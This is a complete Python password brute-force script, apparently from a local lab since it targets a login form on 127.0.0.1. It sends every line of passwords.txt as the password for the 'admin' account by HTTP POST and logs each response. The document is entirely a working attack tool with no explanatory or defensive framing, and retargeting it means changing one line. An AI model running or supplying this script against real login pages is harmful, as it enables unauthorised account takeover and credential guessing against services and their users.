# attacker.py - simple brute-force POSTer (no Hydra needed)
import time
import requests
from pathlib import Path

URL = "http://127.0.0.1:5000/login"
PASSWORD_FILE = "passwords.txt"
USERNAME = "admin"
DELAY = 0.4

pwfile = Path(PASSWORD_FILE)
if not pwfile.exists():
    print("Error: passwords.txt not found in current folder.")
    raise SystemExit(1)

with pwfile.open() as f:
    for i, line in enumerate(f, start=1):
        pwd = line.strip()
        if not pwd:
            continue
        data = {"username": USERNAME, "password": pwd}
        try:
            r = requests.post(URL, data=data, timeout=5)
            text = r.text.replace("\n"," ")[:140]
            print(f"[{i:03d}] TRY username={USERNAME} password={pwd!r} => {r.status_code} | {text}")
        except Exception as e:
            print(f"[{i:03d}] TRY {pwd!r} => ERROR: {e}")
        time.sleep(DELAY)
print("Done.")
